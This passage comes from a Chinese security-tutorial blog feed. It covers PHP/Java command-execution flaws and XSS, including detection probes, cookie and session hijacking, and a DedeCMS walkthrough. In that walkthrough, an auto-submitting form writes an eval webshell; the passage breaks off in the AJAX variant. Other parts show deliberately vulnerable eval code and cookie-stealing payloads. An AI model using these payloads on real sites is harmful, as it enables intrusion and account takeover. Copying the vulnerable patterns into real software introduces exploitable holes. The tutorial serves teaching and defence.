class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>注：<ul><li>传递参数时，如果参数中有空格，一般在windows下使用双引号(“”)将参数括起来，linux下使用单引号(‘’)括起来，否则将无法正常执行</li></ul></li></ul></li><li><p>代码执行</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>注：<ul><li>eval()可以把字符串按照PHP代码来执行，换句话说，就是可以动态地执行PHP代码。使用eval()需要注意：输入的字符串必须是合法的PHP代码，且必须以分号结尾。</li><li>在ASP、ASP.NET、JAVA中，都有类似的函数或方法可以动态执行代码</li></ul></li></ul></li><li><p>动态函数调用<br>php支持动态函数调用</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">function</span> <span class="token function-definition function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"a"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">b</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string double-quoted-string">"b"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$fun</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//动态调用函数</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  或</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token variable">$fun</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fun'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$par</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'par'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$fun</span><span class="token punctuation">(</span><span class="token variable">$par</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>PHP函数代码执行漏洞<br>在PHP中，代码执行漏洞出现较多。如：</p><pre class="line-numbers language-none"><code class="language-none">preg_replace()ob_start()array_map()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>    <ul><li>array_map()  <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$arr</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$newArray</span><span class="token operator">=</span><span class="token function">array_map</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>  </li><li>注：PHP更多危险函数：《高级PHP应用程序漏洞审核技术》</li></ul></li></ul><h3 id="Java命令执行"><a href="#Java命令执行" class="headerlink" title="Java命令执行"></a>Java命令执行</h3><p>JAVA体系非常庞大，包括：Java SE、Java EE、Java ME<br>JAVA无论是分支还是框架，都是以Java SE为基础的</p><ul><li>在Java SE中，存在Runtime类，在该类中提供了exec方法用以在单独的进程中执行指定的字符串命令。<ul><li>注：JSP、Servlet、Struts、Spring、Hibernate等技术一般执行外部程序都会调用此方法（或者使用ProcessBuilder类，但较少）</li><li>如果程序员没有正确使用Runtime类，就有可能造成java命令执行漏洞</li><li>还有非常多的JSP木马，也都会使用Runtime.getRuntime().exec()来执行系统命令</li></ul></li></ul><h2 id="框架执行漏洞"><a href="#框架执行漏洞" class="headerlink" title="框架执行漏洞"></a>框架执行漏洞</h2><h3 id="Struts2代码执行漏洞"><a href="#Struts2代码执行漏洞" class="headerlink" title="Struts2代码执行漏洞"></a>Struts2代码执行漏洞</h3><ul><li>例：Struts2&#x2F;XWork &lt; 2.2.0 Remote Command Execution Vulnerability</li></ul><h3 id="ThinkPHP命令执行漏洞"><a href="#ThinkPHP命令执行漏洞" class="headerlink" title="ThinkPHP命令执行漏洞"></a>ThinkPHP命令执行漏洞</h3><h2 id="防范命令执行漏洞"><a href="#防范命令执行漏洞" class="headerlink" title="防范命令执行漏洞"></a>防范命令执行漏洞</h2><ul><li>尽量不要使用系统执行命令</li><li>在进入执行命令函数&#x2F;方法之前，变量一定要做好过滤，对敏感字符进行转义</li><li>在使用动态函数之前，确保使用的函数是指定的函数之一</li><li>对PHP语言来说，不能完全控制的危险函数最好不要使用</li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>XSS漏洞</title>
      <link href="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/12/17/xss%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS跨站脚本漏洞"><a href="#XSS跨站脚本漏洞" class="headerlink" title="XSS跨站脚本漏洞"></a>XSS跨站脚本漏洞</h1><h2 id="xss介绍"><a href="#xss介绍" class="headerlink" title="xss介绍"></a>xss介绍</h2><p>xss是指攻击者在网页中嵌入客户端脚本，通常是javascript编写的恶意代码，当用户使用浏览器浏览被嵌入恶意代码的网页时，恶意代码就会在用户的浏览器上执行</p><h2 id="xss恶意代码编写语言"><a href="#xss恶意代码编写语言" class="headerlink" title="xss恶意代码编写语言"></a>xss恶意代码编写语言</h2><p>一般是使用javascript语言编写的，也有使用ActionScript,VBScript等客户端脚本语言编写的，但较为少见</p><h2 id="javascript可以做什么"><a href="#javascript可以做什么" class="headerlink" title="javascript可以做什么"></a>javascript可以做什么</h2><ul><li>获取用户的cookie—-&gt;盗取用户cookie</li><li>改变网页内容——-&gt;黑掉页面</li><li>URL跳转——–&gt;导航到恶意网站</li></ul><h2 id="js加载外部脚本"><a href="#js加载外部脚本" class="headerlink" title="js加载外部脚本"></a>js加载外部脚本</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"http://www.xxser.org/x.txt"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注：x.txt中存放着攻击者的恶意js代码；<br>js加载外部的代码文件可以是任意扩展名（无扩展名也可以），只要文件中包含js代码就会被执行</p><h2 id="xss类型"><a href="#xss类型" class="headerlink" title="xss类型"></a>xss类型</h2><h3 id="反射型xss-非持久型xss"><a href="#反射型xss-非持久型xss" class="headerlink" title="反射型xss(非持久型xss)"></a>反射型xss(非持久型xss)</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>当用户访问一个带有xss代码的url请求时，服务器端接收数据后处理，然后把带有xss代码的数据发送到浏览器，浏览器解析这段带有xss代码的数据后，最终造成xss漏洞</p><h3 id="存储型xss-持久型xss"><a href="#存储型xss-持久型xss" class="headerlink" title="存储型xss(持久型xss)"></a>存储型xss(持久型xss)</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>攻击者提交一段xss代码后，被服务器端接收并存储，当攻击者再次访问某个页面时，这段xss代码被程序读出来响应给浏览器，造成xss跨站攻击</p><h4 id="存储型xss对比反射型xss-DOM型xss的优点"><a href="#存储型xss对比反射型xss-DOM型xss的优点" class="headerlink" title="存储型xss对比反射型xss,DOM型xss的优点"></a>存储型xss对比反射型xss,DOM型xss的优点</h4><ul><li>更高的隐蔽型</li><li>更大的危害</li></ul><h4 id="存储型xss与反射型，DOM型xss的区别"><a href="#存储型xss与反射型，DOM型xss的区别" class="headerlink" title="存储型xss与反射型，DOM型xss的区别"></a>存储型xss与反射型，DOM型xss的区别</h4><p>反射型xss与DOM型xss执行都必须依靠用户手动去触发，而存储型xss却不需要</p><h4 id="存储型xss漏洞测试步骤"><a href="#存储型xss漏洞测试步骤" class="headerlink" title="存储型xss漏洞测试步骤"></a>存储型xss漏洞测试步骤</h4><ul><li><p>1.首先输入正常的数据，使用firebug快速寻找输入内容的输出点   </p></li><li><ol start="2"><li><ul><li>如果输出显示区域不在html属性内，则可以直接使用xss代码进行注入；</li><li>如果不能得知输出内容的具体位置，则可以使用模糊测试的方法：<ul><li>尝试普通注入（直接插入xss代码) </li><li>尝试闭合标签注入  <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">" <span class="token operator">/</span><span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>  <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">/</span>textarea<span class="token operator">></span>'"<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li></ul></li></ol></li><li><p>3.在插入恶意xss代码后，重新加载页面，xss代码就会被浏览器执行</p></li></ul><h3 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h3><h4 id="DOM介绍"><a href="#DOM介绍" class="headerlink" title="DOM介绍"></a>DOM介绍</h4><p>Document Object Model(文档对象模型)</p><h5 id="DOM规定"><a href="#DOM规定" class="headerlink" title="DOM规定"></a>DOM规定</h5><ul><li>整个文档是一个文档节点</li><li>每个HTML标签是一个元素节点</li><li>包含在HTML元素中的文本是文本节点</li><li>每一个HTML属性是一个属性节点</li><li>节点与节点之间都有等级关系</li></ul><h5 id="DOM树"><a href="#DOM树" class="headerlink" title="DOM树"></a>DOM树</h5><p><img src="/dom.png"><br>注：DOM本身就代表文档的意思，基于DOM型的XSS不需要与服务器端交互，它只发生在客户端处理数据阶段</p><p><code>document.URL</code> #返回当前文档的URL地址</p><p><code>document.write</code> #直接向网页中输出内容</p><h3 id="是否存在xss的测试方法"><a href="#是否存在xss的测试方法" class="headerlink" title="是否存在xss的测试方法"></a>是否存在xss的测试方法</h3><ul><li>1.首先要确定输入点与输出点（输入点就是我们可以在哪个地方输入内容，输出点就是我们输入的内容会显示在哪个地方）</li><li><ol start="2"><li><ul><li>如果我们输入的内容显示在标签中，我们就可以直接插入js代码；</li><li>如果输入的内容显示在标签属性内，那么直接插入的xss代码就不会被执行（因为xss代码出现在属性内，xss代码会被当做属性的值来处理），我们就需要根据相应的标签构造html代码来闭合，然后再插入xss代码</li></ul></li></ol></li></ul><h2 id="检测XSS"><a href="#检测XSS" class="headerlink" title="检测XSS"></a>检测XSS</h2><h3 id="手工检测XSS"><a href="#手工检测XSS" class="headerlink" title="手工检测XSS"></a>手工检测XSS</h3><p>要点：考虑哪里有输入，输入的数据在哪里输出；一定要选择有特殊意义的字符，这样可以快速测试是否存在XSS</p><h4 id="可得知输出位置"><a href="#可得知输出位置" class="headerlink" title="可得知输出位置"></a>可得知输出位置</h4><p>输入一些敏感字符，如: &lt; &gt; “ ‘ () 等，在提交请求后查看HTML源代码，看这些输入的字符是否被转义<br>注：在输出这些敏感字符时，很有可能程序已经做了过滤，这样在寻找这些字符时就不太容易，这时可以输入AAAAA&lt;&gt;”‘&amp;字符串，然后在查找源代码的时候直接查找AAAAA或许比较方便</p><h4 id="无法得知输出位置"><a href="#无法得知输出位置" class="headerlink" title="无法得知输出位置"></a>无法得知输出位置</h4><p>通常会采用输入”&#x2F;&gt;XSS Test来测试</p><h3 id="全自动检测XSS"><a href="#全自动检测XSS" class="headerlink" title="全自动检测XSS"></a>全自动检测XSS</h3><h4 id="专业的xss扫描工具"><a href="#专业的xss扫描工具" class="headerlink" title="专业的xss扫描工具"></a>专业的xss扫描工具</h4><ul><li>XSSER</li><li>XSSF</li><li><a href="http://www.domxssscanner.com/">http://www.domxssscanner.com</a> #专门用来扫描DOM类型的xss</li></ul><h2 id="XSS高级利用"><a href="#XSS高级利用" class="headerlink" title="XSS高级利用"></a>XSS高级利用</h2><h3 id="XSS常见的危害"><a href="#XSS常见的危害" class="headerlink" title="XSS常见的危害"></a>XSS常见的危害</h3><ul><li>盗取用户cookie</li><li>修改网页内容</li><li>网站挂马</li><li>利用网站重定向</li><li>XSS蠕虫</li></ul><h3 id="XSS会话劫持"><a href="#XSS会话劫持" class="headerlink" title="XSS会话劫持"></a>XSS会话劫持</h3><h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h4><h5 id="cookie简介"><a href="#cookie简介" class="headerlink" title="cookie简介"></a>cookie简介</h5><p>cookie是能够让网站服务器把少量文本数据存储到客户端的硬盘、内存，或是从客户端的硬盘、内存读取数据的一种技术</p><h5 id="cookie作用"><a href="#cookie作用" class="headerlink" title="cookie作用"></a>cookie作用</h5><p>因为HTTP协议是无状态的，WEB服务器无法区分请求是否来源于同一个浏览器，所以WEB服务器需要额外的数据用于维持会话。cookie正是一段随http请求、响应一起被传递的额外数据，它的主要作用是标识用户，维持会话</p><h5 id="cookie工作原理"><a href="#cookie工作原理" class="headerlink" title="cookie工作原理"></a>cookie工作原理</h5><p>当你浏览某个网站时，该网站可能向你的电脑硬盘写入一个非常小的文本文件，它可以记录你的用户ID、密码、停留的时间等信息，这个文件就是cookie文件。当你再次来到该网站时，浏览器会自动检测你的硬盘，并将存储在本地的cookie发送给网站，网站通过读取cookie,得知你的相关信息，就可以做出相应的动作，如：直接登录，而无需再次输入账号密码</p><h5 id="cookie分类"><a href="#cookie分类" class="headerlink" title="cookie分类"></a>cookie分类</h5><p>cookie按照在客户端存储的位置，可以分为内存cookie和硬盘cookie</p><ul><li>内存cookie(非持久cookie)<br>内存cookie由浏览器维护，保存在内存中，浏览器关闭后就消失，其存在时间是短暂的</li><li>硬盘cookie(持久cookie)<br>硬盘cookie保存在硬盘里，有一个过期时间，除非用户手工清理或到了过期时间，否则硬盘cookie不会被删除，其存在时间是长期的</li></ul><h5 id="cookie其他"><a href="#cookie其他" class="headerlink" title="cookie其他"></a>cookie其他</h5><ul><li>一个用户的电脑里可能有多个cookie存在，它们分别是不同网站存储的信息，但是你不用担心，一个网站只能取回该网站本身放在电脑的cookie,它无法得知电脑上其他的cookie信息，也无法取得其他任何数据</li><li>cookie是有限制的，大多数浏览器支持最大为4096B的cookie，这样就限制了cookie的大小最多也只能在4KB左右，而且浏览器也限制站点可以在用户计算机上存储cookie的数量。大多数浏览器只允许每个站点存储20个cookie，如果试图存储更多的cookie,则最旧的cookie便会被丢弃。有的浏览器还会对来自所有站点的cookie总数做出绝对限制，通常为300个</li></ul><h5 id="cookie的保存位置"><a href="#cookie的保存位置" class="headerlink" title="cookie的保存位置"></a>cookie的保存位置</h5><ul><li>IE:C:\Documents and Settings\用户名\Cookies文件夹</li></ul><h5 id="cookie格式"><a href="#cookie格式" class="headerlink" title="cookie格式"></a>cookie格式</h5><p>每个cookie文件都是一个TXT文件，以“用户名@网站URL”来命名</p><ul><li>cookie组成<img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/cookie1.png" class="">cookie由变量名（key）和值（value）组成，其属性里既有标准的cookie变量，也有用户自己创建的变量，属性中的变量用“变量&#x3D;值”的形式来保存</li><li>cookie格式<img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/cookie%E6%A0%BC%E5%BC%8F.png" class=""><ul><li>Set-Cookie<br>  HTTP响应头，WEB服务器通过此HTTP头向客户端发送cookie</li><li>name&#x3D;value<br>  这是每一个cookie都必须有的部分。用户可以通过name取得cookie中存放的值（value）.在字符串“name&#x3D;value”中，不含分号，逗号，空格等字符</li><li>expires&#x3D;date<br>  expires确定了cookie的有效终止日期，该属性值date必须以特定的格式来书写  <img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/15-1.png" class="">  GMT表示这是格林尼治时间。<br>  如果不以这样的格式来书写，系统将无法识别<br>  该变量可省，如果缺省，则cookie的属性值不会保存在用户的硬盘中，而仅仅保存在内存中，cookie将随浏览器的关闭而自动消失</li><li>domain&#x3D;domain-name<br>  domain变量确定了哪些Internet域中的web服务器可读取浏览器存储的cookie，即只有来自这个域的页面才可以使用cookie中的信息<br>  这项设置是可选的，如果缺省，值为该web服务器的域名</li><li>path&#x3D;path<br>  path属性定义了web服务器上哪些路径下的页面可获取服务器发送的cookie.如果path属性的值为“&#x2F;”,则web服务器上所有的WWW资源均可读取该cookie<br>  这项设置是可选的，如果缺省，则path的属性值为web服务器传给浏览器的资源路径名<br>  借助对domain和path两个变量的设置，即可有效的控制cookie文件被访问的范围</li><li>Secure<br>  在cookie中标记该变量，表明只有当浏览器和web服务器之间的通信协议为加密认证协议时，浏览器才向服务器提交相应的cookie.当前这种协议只有一种，即为HTTPS</li><li>HttpOnly<br>  禁止javascript读取cookie<br>  注：cookie中的内容大多数经过了加密处理，因此，一般用户看来只是一些毫无意义的字母数字组合，只有服务器的处理程序才知道它们真正的含义</li></ul></li></ul><h5 id="cookie获取过程"><a href="#cookie获取过程" class="headerlink" title="cookie获取过程"></a>cookie获取过程</h5><p>某用户访问某网站，浏览器就会向web服务器发送请求，此时请求的请求头中没有Cookie头，浏览器给web服务器发送请求后接收到web服务器的响应，web服务器的响应头中有Set-Cookie头，web服务器通过该头向浏览器发送cookie.当用户再次访问该网站，浏览器就会自动向web服务器发送cookie,于是访问请求的请求头中就会带有Cookie头。</p><h5 id="读写cookie"><a href="#读写cookie" class="headerlink" title="读写cookie"></a>读写cookie</h5><p>javascript,java,php,asp.net都拥有读写cookie的能力</p><h5 id="用cookie在另外一个浏览器上登录"><a href="#用cookie在另外一个浏览器上登录" class="headerlink" title="用cookie在另外一个浏览器上登录"></a>用cookie在另外一个浏览器上登录</h5><ul><li>burp<br>利用xss漏洞获取用户的cookie,打开burp,选择Proxy–&gt;Options–&gt;Match and Replace选项，单击Add按钮添加Request header。然后在Match输入框内输入要替换的请求头，在replace输入框中填入要替换的cookie，在上面的步骤中，如果发现有Cookie请求头，就替换为更改后的cookie,最后访问网站即可</li><li>使用chrome浏览器自带的console（F12控制台）<img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/16-1.png" class="">使用document.cookie设置重复的key,那么chrome浏览器就会替换原来的key值</li></ul><h4 id="xss会话劫持原理"><a href="#xss会话劫持原理" class="headerlink" title="xss会话劫持原理"></a>xss会话劫持原理</h4><p>攻击者通过XSS攻击获取用户的cookie(cookie劫持),不需要输入账号密码就可以以该用户的身份登录账户<br>注:有些开发者使用cookie时，不会当做身份验证来使用，比如：存储一些临时信息。在这种情况下，即使黑客拿到了cookie也没用，所以并不是只要有cookie就可以会话劫持</p><h4 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h4><h5 id="session"><a href="#session" class="headerlink" title="session"></a>session</h5><ul><li>session是除cookie之外维持会话状态的另一种形式</li><li>session在计算机中，尤其是在网络应用中，被称为“会话”，session机制是一种服务器端的机制，服务器使用一种类似于散列表的结构来保存信息</li><li>web中的session是指用户在浏览某个网站时，从进入网站到浏览器关闭所经过的这段时间，也就是一次客户端与服务器端的对话，被称为session。当浏览器关闭后，session自动注销</li></ul><h5 id="sessionid"><a href="#sessionid" class="headerlink" title="sessionid"></a>sessionid</h5><ul><li>每个用户的会话状态都是不同的session,服务器通过sessionid来区分用户</li><li>sessionid获取过程<br>当用户第一次连接到服务器时，会自动分配一个sessionid,这个sessionid是唯一的且不会重复。如果服务器关闭或浏览器关闭，session将自动注销。当用户再次连接时，将会重新分配</li><li>sessionid可以存储在cookie中，相当于临时cookie<ul><li>请求头  <img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/18-1.png" class=""></li><li>响应头  <img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/19-1.png" class=""></li></ul></li><li>sessionid也可能以其他方式展现<ul><li>例如  <img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/17-1.png" class=""></li></ul></li></ul><h5 id="session与cookie最大的区别"><a href="#session与cookie最大的区别" class="headerlink" title="session与cookie最大的区别"></a>session与cookie最大的区别</h5><p>cookie是将数据存储在客户端，而session是保存在服务器端，仅仅在客户端存储一个id。相对来说，session要比cookie要安全</p><h5 id="session劫持"><a href="#session劫持" class="headerlink" title="session劫持"></a>session劫持</h5><p>session是浏览器与服务器之间的一次会话，其中服务器依靠sessionid来区分不同的用户，当浏览器关闭后，session会随之消失。因此我们如果能够在浏览器与服务器会话没有结束之前拿到这个sessionid,同样也能会话劫持</p><h3 id="XSS-Framework"><a href="#XSS-Framework" class="headerlink" title="XSS Framework"></a>XSS Framework</h3><h4 id="XSS漏洞利用框架"><a href="#XSS漏洞利用框架" class="headerlink" title="XSS漏洞利用框架"></a>XSS漏洞利用框架</h4><ul><li>BeEF</li><li>XSS Proxy</li><li>Backframe</li><li>XSSER.ME(XSS Platform)</li></ul><h4 id="XSS漏洞利用框架作用"><a href="#XSS漏洞利用框架作用" class="headerlink" title="XSS漏洞利用框架作用"></a>XSS漏洞利用框架作用</h4><p>XSS框架是一组“javascript工具集合”，比如：键盘输入记录、盗取cookie、表单劫持等。使用起来非常简单，完全不需要编写代码。</p><h4 id="XSS-Shell"><a href="#XSS-Shell" class="headerlink" title="XSS Shell"></a>XSS Shell</h4><p>web应用程序，与XSS Platform类似，使用asp编写，适用于个人</p><h4 id="XSS-Platform"><a href="#XSS-Platform" class="headerlink" title="XSS Platform"></a>XSS Platform</h4><p>多用户的，只需注册一个账户，即可使用XSS Platform的功能，不用自己去搭建独立的网站</p><ul><li>XSSER.ME</li><li>XSSING</li></ul><h3 id="XSS-GetShell-利用xss获取webshell"><a href="#XSS-GetShell-利用xss获取webshell" class="headerlink" title="XSS GetShell(利用xss获取webshell)"></a>XSS GetShell(利用xss获取webshell)</h3><h4 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h4><p>必须在特定的场景下才可以完成</p><h4 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h4><p>DedeCMSV57_GBK_SP1版本feedback_ajax.php与feedback.php都存在同样的xss跨站漏洞</p><ul><li>在前台页面提交数据到feedback_ajax.php，拦截HTTP请求<img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/1-5.png" class=""><img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/2-3.png" class="">在请求中可以看到有很多隐藏的参数，如dopost,aid,fid,face等，但此处的参数项都做了过滤，不存在xss,但通过代码审计<img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/3-2.png" class=""><img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/4-2.png" class=""><img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/5-3.png" class="">我们发现在评论提交时，表单中没有title字段，但在PHP程序中却冒出来一个$title变量，并使用addslashes()对$title变量过滤后赋值给变量$arctitle,最后把$arctitle的值存入了数据库。但是addslashes()的作用是对预定义字符进行转义（在预定义字符前添加“\”,预定义字符有’(单引号），”(双引号), \(反斜杠), NULL(空字符)），addslashes()经常用来过滤SQL注入，但对xss来说没有任何作用<br>因此我们可以拦截数据包，在数据包中加入title参数，参数值为xss代码<img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/6-2.png" class="">就这样，xss代码就被存入了数据库，形成了存储型XSS漏洞<br>存入的xss代码会在访问管理页面，浏览评论管理页面时输出<img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/7-2.png" class="">由于DedeCMS是一个非常强大的网站内容管理系统，它有一个模块可以进行在线文件管理，如：新建、编辑、删除文件，因此我们可以利用它的这个功能来获取webshell<br>对新建文件功能进行抓包，HTTP请求为<img src="/2021/12/17/xss%E6%BC%8F%E6%B4%9E/8-1.png" class="">如果以管理员的身份来提交这段HTTP请求，就会向服务器写入shell文件<br>攻击者使用两种手段静悄悄的发起这段HTTP请求<ul><li><p>form表单自动提交<br>  构造HTML自动提交表单  </p>  <pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/dede/file_manage_control.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>iframe<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>fmdo<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>edit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>backurl<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>filename<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>xss.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>str<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;?php @eval($_POST['chopper']);?><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  <code>这段表单可以自动提交POST请求，但并不适用于此时的这种环境，因为这段HTML文本太长，虽然可以用&lt;iframe&gt;等标签缩短，但却不如ajax适用</code></p></li><li><p>AJAX发送post请求</p>  <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> xmlhttp<span class="token punctuation">;</span> <span class="token keyword">function</span> <span class="token function">createXMLHTTP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>window<span class="token 